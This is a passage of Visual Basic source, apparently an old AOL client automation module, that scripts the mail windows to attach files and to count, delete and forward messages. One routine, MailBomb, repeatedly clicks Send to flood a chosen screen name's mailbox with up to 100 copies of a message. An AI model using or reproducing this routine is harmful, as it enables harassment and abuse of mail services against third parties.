AoIcon = FindWindowEx(AoBar, AoIcon, "_AOL_Icon", vbNullString)
Call PostMessage(AoIcon, &H201, 0, 0)
Call PostMessage(AoIcon, &H202, 0, 0)
End If
Do
DoEvents
Mail = FindWindowEx(AoMdiClient, 0, "AOL Child", "Write Mail")
MailSendIcon1 = FindWindowEx(Mail, 0, "_AOL_Icon", vbNullString)
MailSendIcon2 = FindWindowEx(Mail, MailSendIcon1, "_AOL_Icon", vbNullString)
MailSendIcon3 = FindWindowEx(Mail, MailSendIcon2, "_AOL_Icon", vbNullString)
MailSendIcon4 = FindWindowEx(Mail, MailSendIcon3, "_AOL_Icon", vbNullString)
MailsendIcon5 = FindWindowEx(Mail, MailSendIcon4, "_AOL_Icon", vbNullString)
MailSendIcon6 = FindWindowEx(Mail, MailsendIcon5, "_AOL_Icon", vbNullString)
MailSendIcon7 = FindWindowEx(Mail, MailSendIcon6, "_AOL_Icon", vbNullString)
MailSendIcon8 = FindWindowEx(Mail, MailSendIcon7, "_AOL_Icon", vbNullString)
MailSendIcon9 = FindWindowEx(Mail, MailSendIcon8, "_AOL_Icon", vbNullString)
MailSendIcon10 = FindWindowEx(Mail, MailSendIcon9, "_AOL_Icon", vbNullString)
MailSendIcon11 = FindWindowEx(Mail, MailSendIcon10, "_AOL_Icon", vbNullString)
MailSendIcon12 = FindWindowEx(Mail, MailSendIcon11, "_AOL_Icon", vbNullString)
AttachIcon = FindWindowEx(Mail, MailSendIcon12, "_AOL_Icon", vbNullString)
Loop Until Mail <> 0 And MailSendIcon1 <> 0 And MailSendIcon2 <> 0 And MailSendIcon3 <> 0 And MailSendIcon4 <> 0 And MailsendIcon5 <> 0 And MailSendIcon6 <> 0 And MailSendIcon7 <> 0 And MailSendIcon8 <> 0 And MailSendIcon9 <> 0 And MailSendIcon10 <> 0 And MailSendIcon11 <> 0 And MailSendIcon12 <> 0 And AttachIcon <> 0
Pause (1)
Call PostMessage(AttachIcon, &H201, 0, 0)
Call PostMessage(AttachIcon, &H202, 0, 0)
Do
DoEvents
AoModal = FindWindow("_AOL_Modal", "Attachments")
ModalAttachIcon = FindWindowEx(AoModal, 0, "_AOL_Icon", vbNullString)
ModalOkIcon = FindWindowEx(AoModal, ModalAttachIcon, "_AOL_Icon", vbNullString)
ModalOkIcon = FindWindowEx(AoModal, ModalOkIcon, "_AOL_Icon", vbNullString)
Loop Until ModalAttachIcon <> 0 And ModalOkIcon <> 0
Pause (1)
Call PostMessage(ModalAttachIcon, &H201, 0, 0)
Call PostMessage(ModalAttachIcon, &H202, 0, 0)
Do
DoEvents
AttachmentsDialog = FindWindow("#32770", "Attach")
FileEdit = FindWindowEx(AttachmentsDialog, 0, "Edit", vbNullString)
OpenButton = FindWindowEx(AttachmentsDialog, 0, "Button", vbNullString)
OpenButton = FindWindowEx(AttachmentsDialog, OpenButton, "Button", vbNullString)
Loop Until AttachmentsDialog <> 0 And FileEdit <> 0 And OpenButton <> 0
Pause (1)
Call SendMessageByString(FileEdit, &HC, 0, "")
Call SendMessageByString(FileEdit, &HC, 0, Path)
Call PostMessage(OpenButton, &H201, 0, 0)
Call PostMessage(OpenButton, &H202, 0, 0)
Call PostMessage(ModalOkIcon, &H201, 0, 0)
Call PostMessage(ModalOkIcon, &H202, 0, 0)
End Sub
Public Sub MailBomb(SN As String, Subject As String, message As String, Optional MaxBombs As Long = "100", Optional Delay As Single = "2")
        Dim AoIcon As Long, MessageOk As Long, OkButton1 As Long
        Dim Bomb As Long, OkButton2 As Long
Call MailSetPreferences(, False)
Call MailPrep(SN$, Subject$, message$)
Do: DoEvents
AoIcon& = NextOfClassByCount(FindSendWindow&, "_AOL_Icon", 14)
Loop Until FindSendWindow& <> 0& And AoIcon& <> 0&
For Bomb& = 1 To MaxBombs&
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
If Bomb& >= MaxBombs& Then
Call MailSetPreferences(, True)
Call WinClose(FindWindowEx(AolMDI&, 0&, "AOL Child", "Write Mail"))
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
OkButton1& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
OkButton2& = FindWindowEx(MessageOk&, OkButton1&, "Button", vbNullString)
Loop Until MessageOk& <> 0& And OkButton1& <> 0& And OkButton2& <> 0&
If MessageOk& <> 0& Then
Call PostMessage(OkButton2&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OkButton2&, WM_KEYUP, VK_SPACE, 0&)
Exit Sub
ElseIf MessageOk& = 0& And FindWindowEx(AolMDI&, 0&, "AOL Child", "Write Mail") = 0& Then
Exit Sub
End If
End If
Call Pause(Val(Delay))
Next Bomb&
End Sub
Public Sub MailCheckReturnReceipts(CheckReturnReceipts As Boolean)
        Dim CheckBox As Long
If FindSendWindow& = 0& Then Exit Sub
CheckBox& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Checkbox", vbNullString)
If CheckReturnReceipts = True Then
Call PostMessage(CheckBox&, BM_SETCHECK, True, 0&)
ElseIf CheckReturnReceipts = False Then
Call PostMessage(CheckBox&, BM_SETCHECK, False, 0&)
End If
End Sub
Public Sub MailCleanFlash()
        Dim AoTree As Long, Number As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
For Number& = 0 To ListCount(AoTree&) - 1
Do: DoEvents
Call MailDeleteFlashIndex(Number&)
Loop Until ListCount(AoTree&) = 0&
Next Number&
End Sub
Public Sub MailCleanNew()
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim Number As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
For Number& = 0 To ListCount(AoTree&) - 1
Do: DoEvents
Call MailDeleteNewIndex(Number&)
Loop Until ListCount(AoTree&) = 0&
Next Number&
End Sub
Public Sub MailCleanOld()
        Dim TabControl As Long, TabPage1 As Long, TabPage2 As Long
        Dim AoTree As Long, Number As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
For Number& = 0 To ListCount(AoTree&) - 1
Do: DoEvents
Call MailDeleteOldIndex(Number&)
Loop Until ListCount(AoTree&) = 0&
Next Number&
End Sub
Public Sub MailCleanSent()
        Dim TabControl As Long, TabPage1 As Long, TabPage2 As Long
        Dim TabPage3 As Long, AoTree As Long, Number As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
For Number& = 0 To ListCount(AoTree&) - 1
Do: DoEvents
Call MailDeleteSentIndex(Number&)
Loop Until ListCount(AoTree&) = 0&
Next Number&
End Sub
Public Sub MailClickSend()
        Dim AoIcon As Long
AoIcon& = NextOfClassByCount(FindSendWindow&, "_AOL_Icon", 14)
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub MailCloseWindows()
If FindSendWindow& = 0& And FindFwdWindow& = 0& And FindReWindow& = 0& And FindOpenMail& = 0& And FindForwardWindow& = 0& Then Exit Sub
Do: DoEvents
Call PostMessage(FindSendWindow&, WM_CLOSE, 0&, 0&)
Call PostMessage(FindFwdWindow&, WM_CLOSE, 0&, 0&)
Call PostMessage(FindForwardWindow&, WM_CLOSE, 0&, 0&)
Call PostMessage(FindReWindow&, WM_CLOSE, 0&, 0&)
Call PostMessage(FindOpenMail&, WM_CLOSE, 0&, 0&)
Loop Until FindForwardWindow& = 0& And FindSendWindow& = 0& And FindFwdWindow& = 0& And FindReWindow& = 0& And FindOpenMail& = 0&
End Sub
Public Function MailCountFlash() As Long
        Dim AoTree As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
MailCountFlash& = ListCount(AoTree&)
End Function
Public Function MailCountFromSnFlash(SN As String) As Long
        Dim MailIndex As Long, PrepCount As Long
MailCountFromSnFlash& = 0
For MailIndex& = 0 To MailCountFlash - 1
If LCase(TrimSpaces(MailSenderFlash(MailIndex&))) = LCase(TrimSpaces(SN$)) Then
PrepCount& = Val(PrepCount&) + 1
End If
Next MailIndex&
MailCountFromSnFlash& = PrepCount&
End Function
Public Function MailCountFromSnNew(SN As String) As Long
        Dim MailIndex As Long, PrepCount As Long
MailCountFromSnNew& = 0
For MailIndex& = 0 To MailCountNew - 1
If LCase(TrimSpaces(MailSenderNew(MailIndex&))) = LCase(TrimSpaces(SN$)) Then
PrepCount& = Val(PrepCount&) + 1
End If
Next MailIndex&
MailCountFromSnNew& = PrepCount&
End Function
Public Function MailCountFromSnOld(SN As String) As Long
        Dim MailIndex As Long, PrepCount As Long
MailCountFromSnOld& = 0
For MailIndex& = 0 To MailCountOld - 1
If LCase(TrimSpaces(MailSenderOld(MailIndex&))) = LCase(TrimSpaces(SN$)) Then
PrepCount& = Val(PrepCount&) + 1
End If
Next MailIndex&
MailCountFromSnOld& = PrepCount&
End Function
Public Function MailCountFromSnSent(SN As String) As Long
        Dim MailIndex As Long, PrepCount As Long
MailCountFromSnSent& = 0
For MailIndex& = 0 To MailCountSent - 1
If LCase(TrimSpaces(MailSenderSent(MailIndex&))) = LCase(TrimSpaces(SN$)) Then
PrepCount& = Val(PrepCount&) + 1
End If
Next MailIndex&
MailCountFromSnSent& = PrepCount&
End Function
Public Function MailCountNew() As Long
        Dim TabControl As Long, TabPage As Long, AoTree As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
MailCountNew& = ListCount(AoTree&)
End Function
Public Function MailCountOld() As Long
        Dim TabControl As Long, TabPage1 As Long, TabPage2 As Long
        Dim AoTree As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
MailCountOld& = ListCount(AoTree&)
End Function
Public Function MailCountSent() As Long
        Dim TabControl As Long, TabPage1 As Long, TabPage2 As Long
        Dim TabPage3 As Long, AoTree As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
MailCountSent& = ListCount(AoTree&)
End Function
Public Sub MailDeleteFlashIndex(MailIndex As Long)
        Dim AoTree As Long, AoIcon As Long, MessageOk As Long
        Dim OKButton As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
AoIcon& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(FindFlashMailBox&, AoIcon&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(FindFlashMailBox&, AoIcon&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(FindFlashMailBox&, AoIcon&, "_AOL_Icon", vbNullString)
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Loop Until MessageOk& <> 0& And OKButton& <> 0&
If MessageOk& <> 0& Then
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Exit Sub
End If
End Sub
Public Sub MailDeleteFlashSender(MailSender As String)
        Dim AoTree As Long, SearchList As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderFlash(SearchList&)) = LCase(MailSender$) Then
Call MailDeleteFlashIndex(SearchList&)
SearchList& = SearchList& - 1
End If
Next SearchList&
End Sub
Public Sub MailDeleteFlashSubject(MailSubject As String)
        Dim AoTree As Long, SearchList As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectFlash(SearchList&)) = LCase(MailSubject$) Then
Call MailDeleteFlashIndex(SearchList&)
SearchList& = SearchList& - 1
End If
Next SearchList&
End Sub
Public Sub MailDeleteNewIndex(MailIndex As Long)
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim AoIcon As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
If MailIndex& > ListCount(AoTree&) - 1 Or MailIndex& < 0& Then Exit Sub
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
AoIcon& = NextOfClassByCount(FindMailBox&, "_AOL_Icon", 7)
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub MailDeleteNewSender(MailSender As String)
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim SearchList As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderNew(SearchList&)) = LCase(MailSender$) Then
Call MailDeleteNewIndex(SearchList&)
SearchList& = SearchList& - 1
End If
Next SearchList&
End Sub
Public Sub MailDeleteNewSubject(MailSubject As String)
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim SearchList As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectNew(SearchList&)) = LCase(MailSubject$) Then
Call MailDeleteNewIndex(SearchList&)
SearchList& = SearchList& - 1
End If
Next SearchList&
End Sub
Public Sub MailDeleteOldIndex(MailIndex As Long)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim AoIcon As Long, TabPage2 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
AoIcon& = NextOfClassByCount(FindMailBox&, "_AOL_Icon", 7)
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub MailDeleteOldSender(MailSender As String)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim SearchList As Long, TabPage2 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderOld(SearchList&)) = LCase(MailSender$) Then
Call MailDeleteOldIndex(SearchList&)
SearchList& = SearchList& - 1
End If
Next SearchList&
End Sub
Public Sub MailDeleteOldSubject(MailSubject As String)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim SearchList As Long, TabPage2 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectOld(SearchList&)) = LCase(MailSubject$) Then
Call MailDeleteOldIndex(SearchList&)
SearchList& = SearchList& - 1
End If
Next SearchList&
End Sub
Public Sub MailDeleteSentIndex(MailIndex As Long)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim AoIcon As Long, TabPage2 As Long, TabPage3 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
AoIcon& = NextOfClassByCount(FindMailBox&, "_AOL_Icon", 7)
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub MailDeleteSentSender(MailSender As String)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim SearchList As Long, TabPage2 As Long, TabPage3 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderSent(SearchList&)) = LCase(MailSender$) Then
Call MailDeleteSentIndex(SearchList&)
SearchList& = SearchList& - 1
End If
Next SearchList&
End Sub
Public Sub MailDeleteSentSubject(MailSubject As String)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim SearchList As Long, TabPage2 As Long, TabPage3 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectSent(SearchList&)) = LCase(MailSubject$) Then
Call MailDeleteSentIndex(SearchList&)
SearchList& = SearchList& - 1
End If
Next SearchList&
End Sub
Public Function MailErrorNameCount() As Long
        Dim AoView As Long, ErrorTxt As String, PrepCount As Long
If FindErrorWindow& = 0& Then Exit Function
AoView& = FindWindowEx(FindErrorWindow&, 0&, "_AOL_View", vbNullString)
ErrorTxt$ = GetText(AoView&)
PrepCount& = PrepCount& + StringCount(LCase(TrimSpaces(ErrorTxt$)), LCase(TrimSpaces(" - This is not a known member.")))
PrepCount& = PrepCount& + StringCount(LCase(TrimSpaces(ErrorTxt$)), LCase(TrimSpaces("- This member is currently not accepting e-mail from your account.")))
PrepCount& = PrepCount& + StringCount(LCase(TrimSpaces(ErrorTxt$)), LCase(TrimSpaces(" - This member is currently not accepting e-mail attachments or embedded files.")))
PrepCount& = PrepCount& + StringCount(LCase(TrimSpaces(ErrorTxt$)), LCase(TrimSpaces(" - This member's mailbox is full.")))
MailErrorNameCount& = PrepCount&
End Function
Public Sub MailForwardFlash(MailIndex As Long, ScreenName As String, message As String, Optional TrimFwd As Boolean = False, Optional ReturnReceipts As Boolean = False)
        Dim ForwardWindow As Long, SendWindow As Long, ForwardIcon As Long
        Dim AoEdit1 As Long, AoEdit2 As Long, AoEdit3 As Long, RichText As Long
        Dim SendIcon As Long, AoModal As Long, ModalIcon As Long
Call MailOpenFlashIndex(MailIndex&)
Do: DoEvents
ForwardWindow& = FindForwardWindow&
Loop Until ForwardWindow& <> 0&
ForwardIcon& = NextOfClassByCount(ForwardWindow&, "_AOL_Icon", 7)
Call ClickIcon(ForwardIcon&)
Do: DoEvents
SendWindow& = FindSendWindow&
AoEdit1& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(FindSendWindow&, AoEdit1&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(FindSendWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
RichText& = FindWindowEx(FindSendWindow&, 0&, "RICHCNTL", vbNullString)
Loop Until SendWindow& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0& And AoEdit3& <> 0& And RichText& <> 0&
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, ScreenName$)
Call SendMessageByString(RichText&, WM_SETTEXT, 0&, message$)
If ReturnReceipts = True Then Call MailCheckReturnReceipts(True)
If TrimFwd = True Then Call MailRemoveFwd
SendIcon& = NextOfClassByCount(FindSendWindow&, "_AOL_Icon", 12)
Call ClickIcon(SendIcon&)
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", vbNullString)
ModalIcon& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Loop Until (AoModal& <> 0& And ModalIcon& <> 0&) Or FindSendWindow& = 0&
If AoModal& <> 0& Then
Call PostMessage(ModalIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(ModalIcon&, WM_LBUTTONUP, 0&, 0&)
Call WinClose(FindForwardWindow&)
Exit Sub
ElseIf AoModal& = 0& Then
Call WinClose(FindForwardWindow&)
Exit Sub
End If
End Sub
Public Sub MailForwardNew(MailIndex As Long, ScreenName As String, message As String, Optional TrimFwd As Boolean = False, Optional ReturnReceipts As Boolean = False)
        Dim ForwardWindow As Long, SendWindow As Long, ForwardIcon As Long
        Dim AoEdit1 As Long, AoEdit2 As Long, AoEdit3 As Long, RichText As Long
        Dim SendIcon As Long, AoModal As Long, ModalIcon As Long
Call MailOpenNewIndex(MailIndex&)
Do: DoEvents
ForwardWindow& = FindForwardWindow&
Loop Until ForwardWindow& <> 0&
ForwardIcon& = NextOfClassByCount(ForwardWindow&, "_AOL_Icon", 7)
Call ClickIcon(ForwardIcon&)
Do: DoEvents
SendWindow& = FindSendWindow&
AoEdit1& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(FindSendWindow&, AoEdit1&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(FindSendWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
RichText& = FindWindowEx(FindSendWindow&, 0&, "RICHCNTL", vbNullString)
Loop Until SendWindow& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0& And AoEdit3& <> 0& And RichText& <> 0&
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, ScreenName$)
Call SendMessageByString(RichText&, WM_SETTEXT, 0&, message$)
If ReturnReceipts = True Then Call MailCheckReturnReceipts(True)
If TrimFwd = True Then Call MailRemoveFwd
SendIcon& = NextOfClassByCount(FindSendWindow&, "_AOL_Icon", 12)
Call ClickIcon(SendIcon&)
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", vbNullString)
ModalIcon& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Loop Until (AoModal& <> 0& And ModalIcon& <> 0&) Or FindSendWindow& = 0&
If AoModal& <> 0& Then
Call PostMessage(ModalIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(ModalIcon&, WM_LBUTTONUP, 0&, 0&)
Call WinClose(FindForwardWindow&)
Exit Sub
ElseIf AoModal& = 0& Then
Call WinClose(FindForwardWindow&)
Exit Sub
End If
End Sub
Public Sub MailForwardOld(MailIndex As Long, ScreenName As String, message As String, Optional TrimFwd As Boolean = False, Optional ReturnReceipts As Boolean = False)
        Dim ForwardWindow As Long, SendWindow As Long, ForwardIcon As Long
        Dim AoEdit1 As Long, AoEdit2 As Long, AoEdit3 As Long, RichText As Long
        Dim SendIcon As Long, AoModal As Long, ModalIcon As Long
Call MailOpenOldIndex(MailIndex&)
Do: DoEvents
ForwardWindow& = FindForwardWindow&
Loop Until ForwardWindow& <> 0&
ForwardIcon& = NextOfClassByCount(ForwardWindow&, "_AOL_Icon", 7)
Call ClickIcon(ForwardIcon&)
Do: DoEvents
SendWindow& = FindSendWindow&
AoEdit1& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(FindSendWindow&, AoEdit1&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(FindSendWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
RichText& = FindWindowEx(FindSendWindow&, 0&, "RICHCNTL", vbNullString)
Loop Until SendWindow& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0& And AoEdit3& <> 0& And RichText& <> 0&
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, ScreenName$)
Call SendMessageByString(RichText&, WM_SETTEXT, 0&, message$)
If ReturnReceipts = True Then Call MailCheckReturnReceipts(True)
If TrimFwd = True Then Call MailRemoveFwd
SendIcon& = NextOfClassByCount(FindSendWindow&, "_AOL_Icon", 12)
Call ClickIcon(SendIcon&)
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", vbNullString)
ModalIcon& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Loop Until (AoModal& <> 0& And ModalIcon& <> 0&) Or FindSendWindow& = 0&
If AoModal& <> 0& Then
Call PostMessage(ModalIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(ModalIcon&, WM_LBUTTONUP, 0&, 0&)
Call WinClose(FindForwardWindow&)
Exit Sub
ElseIf AoModal& = 0& Then
Call WinClose(FindForwardWindow&)
Exit Sub
End If
End Sub
Public Sub MailForwardSent(MailIndex As Long, ScreenName As String, message As String, Optional TrimFwd As Boolean = False, Optional ReturnReceipts As Boolean = False)
        Dim ForwardWindow As Long, SendWindow As Long, ForwardIcon As Long
        Dim AoEdit1 As Long, AoEdit2 As Long, AoEdit3 As Long, RichText As Long
        Dim SendIcon As Long, AoModal As Long, ModalIcon As Long
Call MailOpenSentIndex(MailIndex&)
Do: DoEvents
ForwardWindow& = FindForwardWindow&
Loop Until ForwardWindow& <> 0&
ForwardIcon& = NextOfClassByCount(ForwardWindow&, "_AOL_Icon", 7)
Call ClickIcon(ForwardIcon&)
Do: DoEvents
SendWindow& = FindSendWindow&
AoEdit1& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(FindSendWindow&, AoEdit1&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(FindSendWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
RichText& = FindWindowEx(FindSendWindow&, 0&, "RICHCNTL", vbNullString)
Loop Until SendWindow& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0& And AoEdit3& <> 0& And RichText& <> 0&
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, ScreenName$)
Call SendMessageByString(RichText&, WM_SETTEXT, 0&, message$)
If ReturnReceipts = True Then Call MailCheckReturnReceipts(True)
If TrimFwd = True Then Call MailRemoveFwd
SendIcon& = NextOfClassByCount(FindSendWindow&, "_AOL_Icon", 12)
Call ClickIcon(SendIcon&)
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", vbNullString)
